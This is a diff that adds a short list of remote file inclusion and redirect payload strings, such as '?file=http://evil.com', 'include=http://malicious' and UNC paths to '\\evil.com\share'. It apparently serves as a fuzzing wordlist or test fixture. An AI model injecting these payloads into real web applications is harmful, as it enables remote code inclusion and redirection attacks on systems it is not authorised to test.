@@ -1,0 +1,15 @@
+http://evil.com/shell.txt
+https://attacker.com/exploit
+\\\\evil.com\\share
+//evil.com/payload
+ftp://evil.com/malware
+?file=http://evil.com
+include=http://malicious
+require=https://bad.site
+redirect=//evil.com
+?page=//evil.com
+?url=ftp://user:pass@evil.com
+?load=//evil.com/shell
+?import=http://malicious
+\\\\192.168.1.1\\share
+//attacker.local/payload
